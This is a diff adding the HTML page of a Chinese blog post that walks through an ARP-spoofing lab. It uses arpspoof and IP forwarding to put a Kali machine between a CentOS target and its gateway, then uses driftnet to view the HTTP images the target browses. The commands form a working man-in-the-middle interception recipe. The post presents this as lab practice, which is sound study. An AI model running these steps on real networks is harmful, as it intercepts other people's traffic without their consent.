@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zhengxiha.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="一、准备阶段 A、操作系统：123456目标机-centos  192.168.1.33  网关 192.168.1.3攻击方-kali    192.168.1.114要求：1、目标机与攻击机处于同一个局域网2、攻击方需知道目标机的ip和目标机的网关  B、kali所需工具：123456789101、arpspoof（使用apt install dsniff安装，如果出现未找到软件包之类的，多">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小练习-利用arp欺骗获取目标机浏览图片">
+<meta property="og:url" content="http://zhengxiha.github.io/2023/05/04/%E5%B0%8F%E7%BB%83%E4%B9%A0-%E5%88%A9%E7%94%A8arp%E6%AC%BA%E9%AA%97%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%B5%8F%E8%A7%88%E5%9B%BE%E7%89%87/index.html">
+<meta property="og:site_name" content="xiha&#39;s blog">
+<meta property="og:description" content="一、准备阶段 A、操作系统：123456目标机-centos  192.168.1.33  网关 192.168.1.3攻击方-kali    192.168.1.114要求：1、目标机与攻击机处于同一个局域网2、攻击方需知道目标机的ip和目标机的网关  B、kali所需工具：123456789101、arpspoof（使用apt install dsniff安装，如果出现未找到软件包之类的，多">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682588958883-433d250d-3008-47e3-958b-3c927d0165a3.png#averageHue=%23272d3d&clientId=u5017a552-0a73-4&from=paste&height=194&id=u0e5d0114&originHeight=194&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50246&status=done&style=none&taskId=u0c46188f-94dd-4517-b7c8-7e4b78cdce4&title=&width=627">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589324113-13ec8f8e-ea61-4d06-827a-b5e7d043a255.png#averageHue=%23320c27&clientId=u5017a552-0a73-4&from=paste&height=273&id=u386cf0df&originHeight=273&originWidth=553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91844&status=done&style=none&taskId=u3b6af19c-d8a8-4bb3-af47-d2c0c86970e&title=&width=553">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589758417-9a15a4ab-7d30-4080-8d72-7b04ed676bb9.png#averageHue=%23272d3c&clientId=u5017a552-0a73-4&from=paste&height=246&id=u1f74a382&originHeight=246&originWidth=647&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72089&status=done&style=none&taskId=u29a8704b-a6ad-4d09-aae9-e453f4ecb61&title=&width=647">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589968057-85f3e6a7-2593-4409-98f0-a3c1d7b09147.png#averageHue=%23330d27&clientId=u5017a552-0a73-4&from=paste&height=143&id=u22d3c497&originHeight=143&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59771&status=done&style=none&taskId=ud2c7f962-6cbb-4e9b-a988-f1b3febfc3b&title=&width=534">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682590495272-5a23672a-71ef-4756-920b-6bceffc61e68.png#averageHue=%2394744e&clientId=u5017a552-0a73-4&from=paste&height=866&id=u0fb8b485&originHeight=866&originWidth=1596&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1470505&status=done&style=none&taskId=uecb3de18-d2b2-40e4-bafa-25a883d9f90&title=&width=1596">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683102987062-43478815-bedc-4fad-b30b-b5d5b89c6eca.png#averageHue=%232a2f3d&clientId=u925194d7-4358-4&from=paste&height=878&id=u31f37fc2&originHeight=878&originWidth=1668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=191263&status=done&style=none&taskId=u3510c0c6-a88b-40ad-ae24-1ecba883644&title=&width=1668">
+<meta property="article:published_time" content="2023-05-04T09:20:15.000Z">
+<meta property="article:modified_time" content="2024-05-31T04:19:28.165Z">
+<meta property="article:author" content="xiha">
+<meta property="article:tag" content="Kali">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682588958883-433d250d-3008-47e3-958b-3c927d0165a3.png#averageHue=%23272d3d&clientId=u5017a552-0a73-4&from=paste&height=194&id=u0e5d0114&originHeight=194&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50246&status=done&style=none&taskId=u0c46188f-94dd-4517-b7c8-7e4b78cdce4&title=&width=627">
+
+<link rel="canonical" href="http://zhengxiha.github.io/2023/05/04/%E5%B0%8F%E7%BB%83%E4%B9%A0-%E5%88%A9%E7%94%A8arp%E6%AC%BA%E9%AA%97%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%B5%8F%E8%A7%88%E5%9B%BE%E7%89%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>小练习-利用arp欺骗获取目标机浏览图片 | xiha's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">xiha's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://zhengxiha.github.io/2023/05/04/%E5%B0%8F%E7%BB%83%E4%B9%A0-%E5%88%A9%E7%94%A8arp%E6%AC%BA%E9%AA%97%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BA%E6%B5%8F%E8%A7%88%E5%9B%BE%E7%89%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="xiha">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xiha's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          小练习-利用arp欺骗获取目标机浏览图片
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-04 17:20:15" itemprop="dateCreated datePublished" datetime="2023-05-04T17:20:15+08:00">2023-05-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><a name="r0Zwd"></a></p>
+<h1 id="一、准备阶段"><a href="#一、准备阶段" class="headerlink" title="一、准备阶段"></a>一、准备阶段</h1><p><a name="MZAfE"></a></p>
+<h4 id="A、操作系统："><a href="#A、操作系统：" class="headerlink" title="A、操作系统："></a>A、操作系统：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">目标机-centos  192.168.1.33  网关 192.168.1.3</span><br><span class="line">攻击方-kali    192.168.1.114</span><br><span class="line"></span><br><span class="line">要求：</span><br><span class="line">1、目标机与攻击机处于同一个局域网</span><br><span class="line">2、攻击方需知道目标机的ip和目标机的网关</span><br></pre></td></tr></table></figure>
+<p><a name="NNw9c"></a></p>
+<h4 id="B、kali所需工具："><a href="#B、kali所需工具：" class="headerlink" title="B、kali所需工具："></a>B、kali所需工具：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、arpspoof（使用apt install dsniff安装，如果出现未找到软件包之类的，多换几个国内源，再更新下）</span><br><span class="line">2、 driftnet：是一款网络流量捕捉图像并将其显示在小窗口的软件</span><br><span class="line">主要参数：</span><br><span class="line">    -b    捕获到新的图片时发声</span><br><span class="line">    -d    指定保存图片的路径</span><br><span class="line">    -x    指定保存图片的前缀名</span><br><span class="line">    -i    选择监听接口</span><br><span class="line">    -f    读取一个指定pcap数据包中的图片</span><br><span class="line">    -a    后台模式：</span><br><span class="line">    -m    指定保存图片数的数目</span><br></pre></td></tr></table></figure>
+
+<p>二、实操阶段<br />1、kali配置网络<br />将kali的ip设置到与目标机的ip同网段<br />2、相互ping ，查看是否可连通</p>
+<p>3、开始arp攻击：将目标机的网关地址替换成攻击方的ip地址，这样目标机的流量就会从转发到攻击方的机器<br>未开始前查看原始数据未开始前用fping看看同一网段下还存在什么ip,再用arp -a看看目标机的原始arp缓存是什么</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#查看局域网内存在的主机</span><br><span class="line">fping -g 192.168.1.1/24</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682588958883-433d250d-3008-47e3-958b-3c927d0165a3.png#averageHue=%23272d3d&clientId=u5017a552-0a73-4&from=paste&height=194&id=u0e5d0114&originHeight=194&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=50246&status=done&style=none&taskId=u0c46188f-94dd-4517-b7c8-7e4b78cdce4&title=&width=627" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589324113-13ec8f8e-ea61-4d06-827a-b5e7d043a255.png#averageHue=%23320c27&clientId=u5017a552-0a73-4&from=paste&height=273&id=u386cf0df&originHeight=273&originWidth=553&originalType=binary&ratio=1&rotation=0&showTitle=false&size=91844&status=done&style=none&taskId=u3b6af19c-d8a8-4bb3-af47-d2c0c86970e&title=&width=553" alt="image.png"></p>
+<p>开始用arpspoof工具进行arp攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#开启路由转发，实验结束后关闭即可，这个不开的话受害主机就断网了</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward   </span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.33 192.168.1.3</span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line">-i后面的参数是网卡名称</span><br><span class="line">-t后面的参数是目的主机和网关，要截获目的主机发往网关的数据包</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589758417-9a15a4ab-7d30-4080-8d72-7b04ed676bb9.png#averageHue=%23272d3c&clientId=u5017a552-0a73-4&from=paste&height=246&id=u1f74a382&originHeight=246&originWidth=647&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72089&status=done&style=none&taskId=u29a8704b-a6ad-4d09-aae9-e453f4ecb61&title=&width=647" alt="image.png"><br />不终止程序，来到目标机查看arp缓存 <br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682589968057-85f3e6a7-2593-4409-98f0-a3c1d7b09147.png#averageHue=%23330d27&clientId=u5017a552-0a73-4&from=paste&height=143&id=u22d3c497&originHeight=143&originWidth=534&originalType=binary&ratio=1&rotation=0&showTitle=false&size=59771&status=done&style=none&taskId=ud2c7f962-6cbb-4e9b-a988-f1b3febfc3b&title=&width=534" alt="image.png"><br />4、使用driftnet查看<br />此时，在目标机内查看图片（只能查看http的，https无法获取），攻击方在driftnet内就能看到图片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1682590495272-5a23672a-71ef-4756-920b-6bceffc61e68.png#averageHue=%2394744e&clientId=u5017a552-0a73-4&from=paste&height=866&id=u0fb8b485&originHeight=866&originWidth=1596&originalType=binary&ratio=1&rotation=0&showTitle=false&size=1470505&status=done&style=none&taskId=uecb3de18-d2b2-40e4-bafa-25a883d9f90&title=&width=1596" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2023/png/25987745/1683102987062-43478815-bedc-4fad-b30b-b5d5b89c6eca.png#averageHue=%232a2f3d&clientId=u925194d7-4358-4&from=paste&height=878&id=u31f37fc2&originHeight=878&originWidth=1668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=191263&status=done&style=none&taskId=u3510c0c6-a88b-40ad-ae24-1ecba883644&title=&width=1668" alt="image.png"><br />总结：图片抓取不是很准确，有的能抓，有的不能，有时可抓，有时又不可抓。。。。。抓的不全<br />而且这个图片界面也没有滚动条</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Kali/" rel="tag"># Kali</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/04/28/python%E5%A4%9A%E7%89%88%E6%9C%AC%E5%85%B1%E5%AD%98/" rel="prev" title="python多版本共存">
+      <i class="fa fa-chevron-left"></i> python多版本共存
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/05/04/kali2022%E7%9A%84python2.7%E6%B2%A1%E6%9C%89pip/" rel="next" title="kali2022的python2.7没有pip">
+      kali2022的python2.7没有pip <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%87%86%E5%A4%87%E9%98%B6%E6%AE%B5"><span class="nav-number">1.</span> <span class="nav-text">一、准备阶段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#A%E3%80%81%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9A"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">A、操作系统：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#B%E3%80%81kali%E6%89%80%E9%9C%80%E5%B7%A5%E5%85%B7%EF%BC%9A"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">B、kali所需工具：</span></a></li></ol></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">xiha</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+-->
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xiha</span>
+</div>
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
